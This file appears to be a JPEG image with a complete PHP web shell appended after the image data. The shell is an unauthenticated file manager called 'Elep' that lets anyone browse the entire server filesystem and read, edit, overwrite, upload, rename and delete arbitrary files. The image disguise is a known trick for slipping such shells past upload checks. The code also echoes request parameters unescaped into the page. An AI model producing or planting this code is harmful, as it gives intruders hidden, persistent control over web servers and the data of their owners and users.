����␐JFIF�␁␁␁�`�`�����;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 85
���C�␅␃␄␄␄␃␅␄␄␄␅␅␅␆␇␌␈␇␇␇␇␏␋␋	␌␑␏␒␒␑␏␑␑␓␖␜␗␓␔␚␕␑␑␘!␘␚␝␝␟␟␟␓␗"$"␞$␜␞␟␞���C␁␅␅␅␇␆␇␎␈␈␎␞␔␑␔␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞␞���␑␈␁h␁h␃␁"�␂␑␁␃␑␁���␟��␁␅␁␁␁␁␁␁��������␁␂␃␄␅␆␇␈	
␋����␐�␂␁␃␃␂␄␃␅␅␄␄��␁}␁␂␃�␄␑␅␒!1A␆␓Qa␇"q␔2���␈#B��␕R��$3br�	
␖␗␘␙␚%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz�������������������������������������������������������������������������␟␁�␃␁␁␁␁␁␁␁␁␁������␁␂␃␄␅␆␇␈	
␋����␑�␂␁␂␄␄␃␄␇␅␄␄�␁␂w�␁␂␃␑␄␅!1␆␒AQ␇aq␓"2�␈␔B����	#3R�␕br�
␖$4�%�␗␘␙␚&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz������������������������������������������������������������������������␌␃␁�␂␑␃␑�?��.�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�␂�(�+�QI�3L␅��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���@y��-␟�#␒␆y��␂��␎�IޚX��␏�P2�$���␃袊�(���(���(���(���(���(���(���(���(���(���(���(���(���(���3FE �a�␐���(�d␎␘�N^␅M���4␓�G�Ӂ��Mo���O��␁�␙�␕␘$ds�sYz��4]4␡���␑��+��H␝M␄���9վ2�#OL�@ܟH��
O����@}�L���YW␟�␝␗␓=�p�3�! 7'���Z����&;␝"� z␙␕��ם���g�|I␓�j␚���~D␐��Ƕr␡^�2��␕s�␏␘�I🆒T��S�(2���?��␟�y}��␟␗x��␟��m␁�ux�#��s�ھ[Cqg0␖m␒�r␒\�␡
ҏĺ�ҋ{��d^�␏␕�Rrr��#mO��␙Ŭ]\�>��uK�c���␐q�*?ɯL���<zW�>␔񆥥�Ƕ��[␗Ć␁���l��O����␝�b[�␖�␁␟2�␏�␡�+��'c9Yl{I`:�R�
f�ڽ��␖�;�g��8�j�c��}�Z��C�)ʑ�␚X�匌␟J@:�(�P␌�Hz�h@�#֌��<�a␔␜�N>�6Y��␓$ʹ �-ڛhJ�ۆq�i7��s��^{�|c�␞�)�]z�y�␐ۿP+�𗈬�Ma��H�␑␟�_␙?��Lf�G␜����/����U��(��
(��
(��
(��
(��
(��
(��
(��"iX1?.�ቨ�.a�?6I␂"|�O�+��<.2����␁���H�]��aiz�hV�3�G�8���v|�t␇"��.R�␞c�␡�R�7�t+d�(������E���~0
z��␡␕�D�$r2�ۜ~���oC����+Qsvx��~�%�8 �~��_|@�N�␖կ␚81�\␡�gNM�I�#�␡␖x��Þ␛�␚�����Ơ���W�����
�C�i��d�␡���lu;��$��1�G�5��xh\NM�#�o␙�L��Z��v6u��␞+�fd��$H�␛b␃␟�aKi���ܻ�N␃?␡ʥ�t�␞�␕�0F۟��+g�
␅�]���Q��+��r{8"�2��␞8<c5�␔bc/]��␡*�o␕i+��␈��ی�W~␡␒?�U�<Z␕Ĳƻ␙�␂␡
M�>S�4�.ofX�ɑ�␇���␚|֗�␒␇���x␞��␟␏�&�s_�Мp{�W.�14��h�␎~RME�;X�V�X�`q���֡���␙|�␆␗�␕�:���֢oB�1�f�S����<��u␜Ұ;�/�i7:|H&E2J�␃�g���U�m���v��␏J��_�␃PuyR=��␖'�Y:��␒�T2y␎��'�*Ԭ.[�!m����e�m�}ҝ␡Z�_␈�p�����]␛�␂��9�␕=�é���eZ5<�␡�Ծ#�␕��D��0�}�␈���W)�~␋�����H|G�<␒��kn� �������␋����&���(�1��A�Ǹ���M�ǲ�H�����␝��␄i�ZQ␒#�J���Y��ӌ��~����␁ |��|␗�O��␒�>B�P_����␝�␌WI�~Ծ<0␕��4%a�r�����UΉ�>��c��y���~1�␗�␎b�5����␔␇w��|I�ϊ␞1�ٯ��4D`A␘␛��y�{�-+N��
�S�kڲ�V�CXR��)����M�^␓Ѡ�����S��c��^3�␏␑�␞!�
�}b}VBَ'�␁��9�ִ�/␏j~!�]/D�Y_␟�'�׿�}␋�␓���U�␚�Q��DRBͲ>GL�s���SnJ�Q(�␜W����␗��C�x���`rb�F����␑��
}G��:~��çiv��Z�1␜Q�
=�V��&,gߥI␟�␙␄}kds�ѻ4R�V␁E␔P␁E␔P␁E␔P␁E␔P␁E␔P␁E␔P␁H)I����1@␌�(;�␕=7␏Jk␕O�8␇�j���_	ٛ�Vr�\�Q�0��"�=����_���Z;␛-8␑�*ᛯ�␝�[␃�␡i␟��no␋�ZU��>�#/����9�]��x␝����0]�>���3u&��%���S�9/P␄Q���Vҭ�tIb�xP���␗==*9
<�I�,�␂�w�p<␌��۽␚}!<�0��<�s��O␙�>�j��PX�7���u�␂Mr���3�<`�␏Z\��g␝�:^�q�V␌\���W������K��␟g�␕␐.잹ȩ�␕Z]�]�<�nJ␘�␡�}+v-"�L��xP1s�}?ȥr�9MS@���-␕	h�d␓�5���␋␡i�E�␃kg��ڵ1q4��$␃�]���oh�␓␔�~H�␕
jU�d6�`�	j��Z�|A␝a1mR1��,홾f.␇M�z0␄<␐d␝*�␋�2D���^␁�m␑DR��5[�␙�6fA�=jV�m�%%␐�&��ܣ␜
␑␘Lg�-���/���Q^k�U�.����!S����/�+�Tä�w␄��F���Ka6zS���~\�f��N�y1n�W�7��␙<i;␕
gjG␟ l~��C���~,�eنmn@␡�1��{�p=�ڄ8␑�������␐�qڷ4�
�j␡�id�␑���ֺx[␄���r1�␟�O���p�T␗$��5e�␎�%�D���s^��␏�␃��3�␟�Q���P␕eVQ���֧�q9��[�␅��Fہ�3��֮3��␏��␈�kϽ}C�␏␋ߥ���ac��r~��֦␞[�mF��\�'�$ruF�88'���'␃X{Ǒj6p;�␐␁�T0�"/�Ӡ��\�Au�␐�0H�Ş��fD��2�6��X��Eֵ6�␕�����
��.�␁�␑�_q|)��#�6nl���f�␡���8��W��␃�E�h␐��u����C����O=FU[�{�*�
��␆�)-␎J����+s0��(���(���(���(���(���
�␔RRs�␜Rn�8�F␏J�?��␔��␂[␕g␓�␎␆��:��J��⭧����ټ��ь㯸�␡�~ x��4� ~Kt�+��x��␚������r�␅␃␁kо␟�B�N�_3␏3t9�V��|␛␆�n␌����]n�ʷ␞BF␋7@;�+6�jxR�O�H�l���d��4����9_aRM�k�␗�7W�q���␡˵mk0�]␄���\�d␝�5<̾RƩ�ì�z8��- ␟(␟�d�2'�,
����l09��
␒;��␒�␗$␁����␄1����Թ6>[␙Pi�␕�۬h���=�V��'O2V�␙K0������T��I�`z'_֚C�H�/�␑␅G�Է␅���␕4�V�����␂�5,␋up��쇖?夿w�5j␄9]����A��␘Pn��<����:�c��s[V␞␗���5��7����]v��Al�*��բ��p֖Z��	␜P�␏u���{␡␈��_N�␞����]�6�@ȫ␘␘��a␜Տ���@6���s��␐X��+�W�1�q@�t␔X␌鴫␙��`I8�␜�h�3�D��� G��␡�m�
vC�␒ċ�i�␗ҝ�zR�zP!�␗Ҕ`p␅:�P␃
�}��>5|4��V␃R��!�-�␑�䝒�I��␓�,O␘9␕�8�(␇=�e␕"��|␃��ۦ�u␘␞��K␋�*p␏l��?�����B�
����k␟␘@u=$␋Mz%␛%S��r~S��s�W��۴�ͧ�1␘��;Lg�9�9�qw:)Ծ��~Ǟ+��|7s�]M␜�d���9)�␡V5�"��␙�ھ;��/��?�p���ML␂�G��N=���ҾÈ�␂67c<t��_	�U��(��3
(��
(��
(��
(��
(��

␔�␆FI#␔��␞��␛>&X�␟L1#�}0␅␗␙�瞾�o�␗�};��^��̠yJ␆}}ǡ�����Ǿ%␗���␛��!<␄�␝z��b��f���E�e��}�I�]�␇��ֽ␋N��zZ�-�T0�I����Wiie�h�R�in�␟�␚-�␏l����P��N׉b��g��f�I���ìh% �$�L��␌v�ˆ��*n.␘Kr{wa��ҷ�����R�<Lr�:����k�5�n��:ԥ␟|�����m���o
�␚Ʊ-܋��)����]5��c��B�]�u�s��␌Т��8����c�␟��␗���G␐�␁��kQ=
w,␃�#
ό␝��k-�;�␄^�ҥ␐Gg␙��m��J��␎�����m!�{␘3�c��� ���n6!J�MCź^�)��_�\�@����+cß�#`Ĉ#=��߮j
␋ᔶ��/2�>nG␟�z␏�<+␡d�6�3G��<�␟�M4��Ҽ␟␅�����'��
�m4��␙␈H��Ǫ��␞����Յ␘�␑$q�����pxZZ)�gڊ(�␂�(�␂�(�␂�(�␂�(�␂�(�␆�	�W�|s�Z|ak���␑m�D␂�␇�␗�:␞r␡J��EL�r��~wkM����CX��
���␛␝��_v�4�E��|!e�␋u�.W%1�␎zu?θߎ␟␋b�%�#��QB�#␒␖A��pN9��^7�8��R�␡�␋�␅��᭭��D�dA&␗Ӷ␁��J:h9>c�t`␈l�ҝQ+9�erGn�"�␔�0=*�␖�(�␂�(�␂�(�␂�(�␂�(�␆�<py�+␇�^(�#��oU�c���q�␟A[3K␜1�#���?�|��␂���␟��␓B_M���Uo��ny<�1�BW&N��␋�K⏍�ֵX␕�␡��4�␁�\�s^���␇jQ�4ӤM�ب��9�O	�i~␗␅M�����␡�8��␁[��␞�$�a��7 烚%e�1��;�����z7�a␐�X��␎�y␘?�E�␛ѧ�Y���␑�␕��n��*G�1�␇#9␘�U�j:�z���ċ␙��s\␃E�5��d������/S.�8�m��9&�:!O���␒?␔�ڤ�Ii`␆"���ݺ��zUχ�
[)R�S��.OA�ҽ"␛Eh
�J�[���␚K␝4@#W␛؜␁YٳU5␑␒f�␚<�7CIwv�tJ
T␝��␚��␛v�-�~e�␡�3�5��␋�%␗w���␜�Ҷ�9�l��߇o5)��K␞�␏␕�v�␜␑lDڧ�␞�n��␘�bpǠ����z��␒�dP�ch�␇aRm␘���K�h�� ␘���`␔QE�␔QE�␔QE�␔QE�␔QE�␔QE�␔QE�␄P(��␚�␙�y�s␞:�␇��k␒��t���.�f' rq���h�`3|=�������w=ȁv�&��3�p�� 00(��␅␔Q@␅␔Q@␅␔Q@␅␔Q@␈�␜��M
��W�V��漫����o␄�/␌R�P␙F3�y�"���~џ␒�L^␐�����Lu_���ڣ�k�␇Ӵ8�␖#␙ے���y��+M*�>&�4�u+��`=c␜p�␞����oōj���:-�p�wp~���Q*�%*nH�/␓�=�6�a#4��׎��cÚ�w��yC␁�޾��W��␡␇��})��␇��␕��ǚ�E␚E�Q4�w��␇_J��ȨÔ��jf�5�>�<�QLաk�F��␟0$ۏ�i��Qi�<Qܩ���ߣ{qR�\^j�F
"␖PF␌��c��wЧRƼ����}�7r#^����n�����Z[vo���␆�␟>��Ϟ[<�␜t����(c␋␞~��m␘�1��␖��K#�S��I␔␁␏�1S��@�␌��Z@5F)�␑E0
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
(��
)␛8;q�z��j6�:s�␗3yv�
��ӥ�b|J��␡
ͭj'*�"␁����㔃T�y�␋ėc�^lb=$<rx��w�]�����␓O��[��␙�?g��N␄���?�=�J��␟␐��QK�-␜Gn��␞vp��q��␒��+��|Ku�k��/4E��5��6�o#����k��v�.���Z�U�jЏ3Q#�G���̭o�=�uȴY4�␃_�6�<��#��+���]f7��O�Z␘�^��<�␟9鎃ڹ��w:␔��z���F�;K�R%␡�␃�Ͽ���b?�N���~T��7�8␘�mp��:v����␌␇_�q���k��g�����j2��D|�Ǔ�ڵP!���|'����^k[R 2��~X��s��޽SC�␚u��$␈��,�␌a␆���\c␜V�X͑�␔j0�Ԙ␂�␂�S␐QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�R␒␁�-DYD���␜��ye����/x��◌��t␗e�-q%��p␜��␌��ںߎ>7�␚�␐�
N␎�4a�.␈��R�#␃�!{␑�\ts���'᳣xj␑␌a�o%��T␏��9�ڔ�����4|Q��w�Z|Z20�k���G�>��x␙�O�^;�]�o..�t�n7��h�␙����ֆ��[\��y5��/glKv:��x␞��u�␡���^)�␙��␃�-��_ۏL��w����O�Y5y`�����␆6��gҴ�/�ɬ��i��[X��~77O��_	x>}NU��␐����␕=?�=����6;XDa␂�+XSH�R���l�A␌Q��<7ֺ8�@�␑�Ԋ�zS�A7q␕B�
Z(�AE␔P␁E␔P␁E␔P␁E␔P␁E␔P␁E␔P␁E␔P␁E␔P␁E␔P␁E␔P␁E␔P␁E␔P␁E␔P␁E␔P␁E␔P␁E␔P␁E␔P␁^W���Z�#GkM-<�n�G�␈�B�?;�␎ߗ␜d�J�~,x�F�O�n|K�[4�
��␁�s��␜�sI�␁�ƃ�Y�%�]���~{_K6�␑���d�`W␙e�^�Z��␚���.	�␄+��!�g={����␞$�|␡=���Z␛v��␄,\␞:����]ǁ�␛uqn��␟�[?
!?�o�Q�ˑ͝	��7C�Lwf␈bYoG␁␏܋��?�^��_␅5�[��␞��r␡�º/
�n�I�8 �␂␁�9��[��"S␜y\��␕>]␌eR�H-#��#0'�������TH���␃␂�(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��␓����^�c��e��f␄��␒����␛��6�b8�8�l���r␛�1ڀ<���␋��␡&[�^d�B��␏�␝>��ץYY�h�#��0�␃��␏JpP
��c4�␌��␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔�QE␔␁��<!

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Elep</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>

<body>

    <?php


    //function
    function formatSizeUnits($bytes)
    {
        if ($bytes >= 1073741824) {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        } elseif ($bytes > 1) {
            $bytes = $bytes . ' bytes';
        } elseif ($bytes == 1) {
            $bytes = $bytes . ' byte';
        } else {
            $bytes = '0 bytes';
        }
        return $bytes;
    }

    function fileExtension($file)
    {
        return substr(strrchr($file, '.'), 1);
    }

    function fileIcon($file)
    {
        $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");
        $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");
        $ext = strtolower(fileExtension($file));
        if ($file == "error_log") {
            return '<i class="fa-sharp fa-solid fa-bug"></i> ';
        } elseif ($file == ".htaccess") {
            return '<i class="fa-solid fa-hammer"></i> ';
        }
        if ($ext == "html" || $ext == "htm") {
            return '<i class="fa-brands fa-html5"></i> ';
        } elseif ($ext == "php" || $ext == "phtml") {
            return '<i class="fa-brands fa-php"></i> ';
        } elseif (in_array($ext, $imgs)) {
            return '<i class="fa-regular fa-images"></i> ';
        } elseif ($ext == "css") {
            return '<i class="fa-brands fa-css3"></i> ';
        } elseif ($ext == "txt") {
            return '<i class="fa-regular fa-file-lines"></i> ';
        } elseif (in_array($ext, $audio)) {
            return '<i class="fa-duotone fa-file-music"></i> ';
        } elseif ($ext == "py") {
            return '<i class="fa-brands fa-python"></i> ';
        } elseif ($ext == "js") {
            return '<i class="fa-brands fa-js"></i> ';
        } else {
            return '<i class="fa-solid fa-file"></i> ';
        }
    }

    function encodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("ক", "খ", "গ", "ঘ");
        return str_replace($a, $b, $path);
    }
    function decodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("ক", "খ", "গ", "ঘ");
        return str_replace($b, $a, $path);
    }



    $root_path = __DIR__;
    if (isset($_GET['p'])) {
        if (empty($_GET['p'])) {
            $p = $root_path;
        } elseif (!is_dir(decodePath($_GET['p']))) {
            echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
        } elseif (is_dir(decodePath($_GET['p']))) {
            $p = decodePath($_GET['p']);
        }
    } elseif (isset($_GET['q'])) {
        if (!is_dir(decodePath($_GET['q']))) {
            echo ("<script>window.location.replace('?p=');</script>");
        } elseif (is_dir(decodePath($_GET['q']))) {
            $p = decodePath($_GET['q']);
        }
    } else {
        $p = $root_path;
    }
    define("PATH", $p);

    echo ('
<nav class="navbar navbar-light" style="background-color: #e3f2fd;">
  <div class="navbar-brand">
  <a href="?"><img src="https://raw.githubusercontent.com/hurairathexper/elepfilemanager/main/img/icon.png" width="30" height="30" alt=""></a>
');

    $path = str_replace('\\', '/', PATH);
    $paths = explode('/', $path);
    foreach ($paths as $id => $dir_part) {
        if ($dir_part == '' && $id == 0) {
            $a = true;
            echo "<a href=\"?p=/\">/</a>";
            continue;
        }
        if ($dir_part == '')
            continue;
        echo "<a href='?p=";
        for ($i = 0; $i <= $id; $i++) {
            echo str_replace(":", "ঘ", $paths[$i]);
            if ($i != $id)
                echo "ক";
        }
        echo "'>" . $dir_part . "</a>/";
    }
    echo ('
</div>
<div class="form-inline">
<a href="?upload&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button">Upload File</button></a>
<a href="?"><button type="button" class="btn btn-dark">HOME</button></a> 
</div>
</nav>');


    if (isset($_GET['p'])) {

        //fetch files
        if (is_readable(PATH)) {
            $fetch_obj = scandir(PATH);
            $folders = array();
            $files = array();
            foreach ($fetch_obj as $obj) {
                if ($obj == '.' || $obj == '..') {
                    continue;
                }
                $new_obj = PATH . '/' . $obj;
                if (is_dir($new_obj)) {
                    array_push($folders, $obj);
                } elseif (is_file($new_obj)) {
                    array_push($files, $obj);
                }
            }
        }
        echo '
<table class="table table-hover">
  <thead>
    <tr>
      <th scope="col">Name</th>
      <th scope="col">Size</th>
      <th scope="col">Modified</th>
      <th scope="col">Perms</th>
      <th scope="col">Actions</th>
    </tr>
  </thead>
  <tbody>
';
        foreach ($folders as $folder) {
            echo "    <tr>
      <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
      <td><b>---</b></td>
      <td>". date("F d Y H:i:s.", filemtime(PATH . "/" . $folder)) . "</td>
      <td>0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3) . "</a></td>
      <td>
      <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $folder . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
      <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $folder . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
      <td>
    </tr>
";
        }
        foreach ($files as $file) {
            echo "    <tr>
          <td>" . fileIcon($file) . $file . "</td>
          <td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
          <td>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $file)) . "</td>
          <td>0". substr(decoct(fileperms(PATH . "/" .$file)), -3) . "</a></td>
          <td>
          <a title='Edit File' href='?q=" . urlencode(encodePath(PATH)) . "&e=" . $file . "'><i class='fa-solid fa-file-pen'></i></a>
          <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $file . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
          <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $file . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
          <td>
    </tr>
";
        }
        echo "  </tbody>
</table>";
    } else {
        if (empty($_GET)) {
            echo ("<script>window.location.replace('?p=');</script>");
        }
    }
    if (isset($_GET['upload'])) {
        echo '
    <form method="post" enctype="multipart/form-data">
        Select file to upload:
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" class="btn btn-dark" value="Upload" name="upload">
    </form>';
    }
    if (isset($_GET['r'])) {
        if (!empty($_GET['r']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        Rename:
        <input type="text" name="name" value="' . $_GET['r'] . '">
        <input type="submit" class="btn btn-dark" value="Rename" name="rename">
    </form>';
            if (isset($_POST['rename'])) {
                $name = PATH . "/" . $_GET['r'];
                if(rename($name, PATH . "/" . $_POST['name'])) {
                    echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }

    if (isset($_GET['e'])) {
        if (!empty($_GET['e']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        <textarea style="height: 500px;
        width: 90%;" name="data">' . htmlspecialchars(file_get_contents(PATH."/".$_GET['e'])) . '</textarea>
        <br>
        <input type="submit" class="btn btn-dark" value="Save" name="edit">
    </form>';

    if(isset($_POST['edit'])) {
        $filename = PATH."/".$_GET['e'];
        $data = $_POST['data'];
        $open = fopen($filename,"w");
        if(fwrite($open,$data)) {
            echo ("<script>alert('Saved.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        } else {
            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        }
        fclose($open);
    }
        }
    }

    if (isset($_POST["upload"])) {
        $target_file = PATH . "/" . $_FILES["fileToUpload"]["name"];
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<p>".htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.</p>";
        } else {
            echo "<p>Sorry, there was an error uploading your file.</p>";
        }

    }
    if (isset($_GET['d']) && isset($_GET['q'])) {
        $name = PATH . "/" . $_GET['d'];
        if (is_file($name)) {
            if(unlink($name)) {
                echo ("<script>alert('File removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        } elseif (is_dir($name)) {
            if(rmdir($name) == true) {
                echo ("<script>alert('Directory removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        }
    }
    ?>


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
        crossorigin="anonymous"></script>
</body>

</html>
